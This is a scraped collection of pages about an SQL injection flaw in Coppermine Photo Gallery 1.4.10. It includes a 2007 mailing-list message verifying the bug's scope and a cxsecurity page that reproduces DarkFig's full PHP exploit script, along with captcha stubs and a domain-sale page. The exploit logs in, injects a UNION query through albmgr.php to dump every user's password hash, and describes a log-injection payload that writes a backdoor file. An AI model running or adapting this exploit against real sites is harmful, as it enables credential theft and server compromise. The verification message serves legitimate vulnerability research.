=== Content from cxsecurity.com_28ef4bbe_20250126_100704.html ===


---

# Security check:

Captcha. You know what to do. (CXSECURITYIDS)

---



=== Content from www.attrition.org_1d55cf8e_20250125_160229.html ===

# [VIM] Source verify - Coppermine Photo Gallery <= 1.4.10 code injection

**Steven M. Christey**
coley at mitre.org

*Mon Jan 8 20:02:10 EST 2007*

* Previous message: [[VIM] ZDI-07-001: QUALCOMM Eudora WorldMail Remote Management Heap Overflow Vulnerability](001215.html)
* Next message: [[VIM] Source verify of Aratix RFI](001219.html)
* **Messages sorted by:**
  [[ date ]](date.html#1218)
  [[ thread ]](thread.html#1218)
  [[ subject ]](subject.html#1218)
  [[ author ]](author.html#1218)

---

```

Researcher: DarkFig
Ref: BUGTRAQ:20070105 Coppermine Photo Gallery <= 1.4.10 SQL Injection Exploit
<http://www.securityfocus.com/archive/1/archive/1/456051/100/0/threaded>

I looked at the source for 1.4.10.

At the bottom of the post, we have:

  ... that's why we use the html_entity_decode() function.  I just
  wanted < for a remote php code execution sploit without admin rights
  :'(.  When the admin view the security logs, it include
  "security.log.php"...

  (security.log.php)
  ==================
  [...]
  if (!defined('IN_COPPERMINE')) die(); ?>

Due to the IN_COPPERMINE check, we can't do a direct request.  The
question of authentication then comes into play.

viewlog.php has:

  function display_log($logname)
  ...
             log_read($logname);

Note that display_log() is only called if the user has admin privs:

  if (!$USER_DATA['has_admin_access']) {
  ...
  cpg_die(CRITICAL_ERROR,$lang_errors['access_denied'], __FILE__,1);

include/logger.inc.php has:

   define('CPG_SECURITY_LOG','security');
   ...
   function log_read( $log = null ) {
   ...
      $log = 'logs/'.$log.'.log.php';
      @include($log);

So, this is where security.log.php comes from (it's not in the actual
distribution).

login.php shows how we inject the code:

  if (isset($_POST['submitted'])) {
  ...
        log_write("Failed login attempt with Username: {$_POST['username']} from IP {$_SERVER['REMOTE_ADDR']} on " . localised_date(-1,$log_date_fmt),CPG_SECURITY_LOG);

So, we can only access security.log.php using viewlog.php, which can
only be accessed with admin privileges.  So, only admins can execute
arbitrary PHP code.

- Steve

P.S.  The initial report's code from init.inc.php shows some dynamic
variable evaluation that unsets "$$key" for most user-supplied
parameter names, which might allow for some interesting attacks on
HTML_SUBST, but I did not investigate closer, so I can't be sure if
there's really an issue or not.

```

---

* Previous message: [[VIM] ZDI-07-001: QUALCOMM Eudora WorldMail Remote Management Heap Overflow Vulnerability](001215.html)
* Next message: [[VIM] Source verify of Aratix RFI](001219.html)
* **Messages sorted by:**
  [[ date ]](date.html#1218)
  [[ thread ]](thread.html#1218)
  [[ subject ]](subject.html#1218)
  [[ author ]](author.html#1218)

---

[More information about the VIM
mailing list](http://www.attrition.org/mailman/listinfo/vim)



=== Content from cxsecurity.com_144c65be_20250126_100704.html ===


---

# Security check:

Captcha. You know what to do. (CXSECURITYIDS)

---



=== Content from cxsecurity.com_c5fb803d_20250126_100705.html ===


---

# Security check:

Captcha. You know what to do. (CXSECURITYIDS)

---



=== Content from securityreason.com_941914fd_20250125_160226.html ===

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  | | **Coppermine Photo Gallery <= 1.4.10 SQL Injection Exploit** **2007.01.09** Credit:  **[DarkFig](https://cxsecurity.com/author/DarkFig/1/)**  Risk: **Medium** Local: **No** Remote: ****Yes**** CVE: **[CVE-2007-0115](https://cxsecurity.com/cveshow/CVE-2007-0115/ "Click to see CVE-2007-0115")** CWE: **[CWE-89](https://cxsecurity.com/cwe/CWE-89 "Click to see CWE-89")**  CVSS Base Score: **6/10** Impact Subscore: **6.4/10** Exploitability Subscore: **6.8/10** Exploit range: **Remote** Attack complexity: **Medium** Authentication: **Single time** Confidentiality impact: **Partial** Integrity impact: **Partial** Availability impact: **Partial** | | --- | |
| --- | --- | --- | --- |

#!/usr/bin/php
<?php
/\*\*
\* This file require the PhpSploit class.
\* If you want to use this class, the latest
\* version can be downloaded from acid-root.new.fr.
\*\*/
require("phpsploitclass.php");
if($argc < 4)
{
print "n---------------------------------------------------------";
print "nAffected.scr..: Coppermine Photo Gallery <= 1.4.10";
print "nPoc.ID........: 19070104";
print "nType..........: SQL Injection";
print "nRisk.level....: Medium";
print "nSrc.download..: coppermine-gallery.net";
print "nPoc.link......: acid-root.new.fr/poc/19070104.txt";
print "nCredits.......: DarkFig";
print "n---------------------------------------------------------";
print "nUsage.........: php xpl.php <url> <adminuser> <adminpass>";
print "nProxyOptions..: <proxhost:proxport> <proxuser:proxpass>";
print "nExample.......: php xpl.php http://c.com/ admin passwd";
print "n---------------------------------------------------------n";
exit(1);
}
/\*/
[0] => xpl.php [1] => http://localhost/cpg1410/
[2] => root [3] => toor
[4] => localhost:8200 [5] => user:passwd
/\*/
$url=$argv[1];$adu=$argv[2];
$adp=$argv[3];$pxs=$argv[4];
$pxa=$argv[5];
$xpl = new phpsploit();
$xpl->agent("InternetExploiter");
$xpl->cookiejar(1);
$xpl->allowredirection(1);
print "nheader> ===============================================";
print "nheader> Coppermine Photo Gallery 1.4.10 (SQL Injection)";
print "nheader> ===============================================";
if(!empty($pxs)){
print "nstatus> Using a proxy $pxs";
$xpl->proxy($pxs);
}
if(!empty($pxa)){
print "nstatus> Basic proxy authentification $pxa";
$xpl->proxyauth($pxa);
}
/\*/
Table prefix.
/\*/
print "nstatus> Searching the version";
$xpl->get($url.'include/index.html');
if(preg\_match("#Coppermine version: ([0-9]\*.[0-9]\*.[0-9]\*)#",$xpl->getcontent(),$matches)) print "nsploit> Coppermine version ".$matches[1];
else print "nsploit> Not found";
$table = !empty($matches[1]) ? 'cpg'.str\_replace('.','',$matches[1]).'\_users' : 'cpg1410\_users';
/\*/
If you have the admin cookie (but not the password),
replace lines 73=>76 by $xpl->addcookie('yourcookie');
/\*/
print "nstatus> Trying to get logged in";
$xpl->post($url."login.php?referer=index.php","username=$adu&password=$a
dp&remember\_me=1&submitted=Se+Connecter");
if(!preg\_match("#color:red#",$xpl->getcontent())) print "nsploit> Done";
else die("nstatus> Exploit failedn");
/\*/
(usermgr.php)
=============
case 'group\_alb\_access' :
if (isset($\_GET['gid'])) $group\_id = $\_GET['gid'];
$sql = "SELECT group\_name FROM [...] WHERE group\_id = $group\_id [...]";
$result = cpg\_db\_query($sql);
(db\_ecard.php)
==============
$start = isset($\_REQUEST['start']) ? $\_REQUEST['start'] : ''; [...]
if (!$start) {$startFrom = '0';}else{$startFrom=$start;} [...]
$result = cpg\_db\_query("SELECT [...] ORDER BY $sortBy $sortDirection LIMIT $startFrom,$countTo");
(albmgr.php)
============
$cat = isset($\_GET['cat']) ? ($\_GET['cat']) : 0;
if ($cat == 1) $cat = 0;
if (GALLERY\_ADMIN\_MODE) {
$result = cpg\_db\_query("SELECT [...] WHERE category = $cat ORDER BY pos ASC");
(filename\_to\_title())
=====================
$albumid = (isset($\_POST['albumid'])) ? $\_POST['albumid'] : 0;
$albstr = ($albumid) ? " WHERE aid = $albumid" : ''; [...]
$result = cpg\_db\_query("SELECT \* FROM {$CONFIG['TABLE\_PICTURES']} $albstr");
(del\_titles())
==============
$albumid = (isset($\_POST['albumid'])) ? $\_POST['albumid'] : 0;
$albstr = ($albumid) ? " WHERE aid = $albumid" : '';
$result = cpg\_db\_query("SELECT \* FROM {$CONFIG['TABLE\_PICTURES']} $albstr");
/\*/
print "nstatus> Retrieving all members password";
$xpl->get($url."albmgr.php?cat=-1/\*\*/union/\*\*/select/\*\*/user\_name,user\_p
assword/\*\*/from/\*\*/$table/\*");
if(preg\_match\_all("#<option value="album\_no=(.\*),album\_nm='([a-z0-9]{32})'#",$xpl->getcontent(),$ma
tches)) print "nsploit> Done";
else die("nstatus> Exploit failedn");
print "nsploit> +----------------------------------+----------+";
print "nsploit> | PASSWORD | USER |";
print "nsploit> +----------------------------------+----------+";
/\*/
(init.inc.php)
==============
$HTML\_SUBST = array('&' => '&', '"' => '"', '<' => '<', '>' => '>', '%26' => '&', '%22' => '"', '%3C' => '<', '%3E' => '>','%27' => ''', "'" => ''');
[...]
if (is\_array($\_POST)) { // and GET, SERVER, REQUEST...
foreach ($\_POST as $key => $value) {
if (!is\_array($value))
$\_POST[$key] = strtr(stripslashes($value), $HTML\_SUBST);
if (!in\_array($key, $keysToSkip) && isset($$key)) unset($$key);
}
... that's why we use the html\_entity\_decode() function.
I just wanted < for a remote php code execution sploit without admin rights :'(.
When the admin view the security logs, it include "security.log.php"...
(security.log.php)
==================
[...]
if (!defined('IN\_COPPERMINE')) die(); ?>
Denied privileged access to viewlog.php from user Guest at on January 4, 2007, 2:10 pm
Failed login attempt with Username: <?php mail(you); [...] fwrite(backdoor.php); [...] /\* from IP 127.0.0.1 on Jan 04, 2007 at 01:16 PM
/\*/
for($i=0;$i<count($matches[0]);$i++)
{
print "nsploit> | ".$matches[2][$i].' | '.html\_entity\_decode($matches[1][$i]);
if($i==(count($matches[0])-1)){
print "nsploit> +----------------------------------+----------+n";
}
}
?>

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2007010023)
[Tweet](https://twitter.com/share)

Vote for this issue:

 0
 0

50%
50%

#### **Thanks for you vote!**

#### **Thanks for you comment!**Your message is in quarantine 48 hours.

Comment it here.
Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  | **{{ x.nick }}**  | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---  {{ x.comment }} |
| --- | --- |

Show all comments

---

Copyright **2025**, cxsecurity.com

  |  |
Back to Top



=== Content from acid-root.new.fr_954808df_20250125_160225.html ===


="m366 256c0-7-3-12-9-15l-146-92c-6-4-12-4-19 0-6 3-9 8-9 16l0 182c0 8 3 13 9 16 3 2 6 3 9 3 4 0 7-1 10-3l146-92c6-3 9-8 9-15z m146 0c0 18 0 33 0 43 0 10-1 23-3 39-1 16-3 30-6 42-3 14-10 26-20 35-10 10-22 15-35 17-43 4-106 7-192 7-86 0-149-3-192-7-13-2-25-7-35-17-10-9-17-21-20-35-3-12-5-26-6-42-2-16-3-29-3-39 0-10 0-25 0-43 0-18 0-33 0-43 0-10 1-23 3-39 1-16 3-30 6-42 3-14 10-26 20-35 10-10 22-15 35-17 43-4 106-7 192-7 86 0 149 3 192 7 13 2 25 7 35 17 10 9 17 21 20 35 3 12 5 26 6 42 2 16 3 29 3 39 0 10 0 25 0 43z">

# new.fr

## This domain is for sale!

### Domain Facts

No detailed data available!

### The seller

* France

  Seller's country of origin:
* Required to pay VAT
* 2006

  Active since

Make an offer on this domain

## new.fr

You are not the highest bidder!

EUR

* EUR
* GBP
* USD

**Unfortunately your entry contained errors.**

Once the reserve price is met, Sedo automatically bids on your behalf up to your maximum bid.

### Your best offer

The current price of **new.fr** is .

You can place an offer below the seller's listing price, however the seller will only respond if they are interested in negotiating based on this offer.

EUR

* EUR
* GBP
* USD

**Unfortunately your entry contained errors.**

Any offer you submit is binding for seven (7) days.

Minimum offer

Seller's asking price

Payment Options

![](https://cdn.sedo.com/c7r/assets/static/images/details/backgrounds/static/sedo-logo.png)

 [Trustpilot](https://www.trustpilot.com/review/www.sedo.com)
![bbb logo](https://cdn.sedo.com/c7r/assets/static/images/details/backgrounds/static/bbb_logo_parking.png)

Contact Sedo

[[email protected]](/cdn-cgi/l/email-protection)

The domain name (without content) is available for sale by its owner through Sedo's Domain Marketplace. Any offer you submit is binding for 7 days. All quoted prices are final prices.

This domain may be listed as a fundamental term by Afnic. Domains listed as fundamental terms are subject to certain registration and trade restrictions.
It is your responsibility to make sure that all of the conditions that are specific to fundamental term domains are fulfilled before bidding and purchasing this domain. These requirements include:
• Why do you wish to register and/or trade this domain?
• What are your reasons/goals for registering/trading this domain?
After receiving these answers, Afnic may request additional documentation from the owner's registrar. Only then will Afnic determine whether or not to approve the registration/trade.
Important Notice:
In order to purchase a .FR domain and successfully transfer it into your ownership, you must have a personal address in Europe, or a business presence with an associated address in Europe.
Please note that it is a requirement of the .FR registry that any registrant of a .FR domain has a European address. If you do not meet either of these requirements, then you will have to transfer the domain to a registrar that provides a trustee service, i.e. a legal proxy address in France.


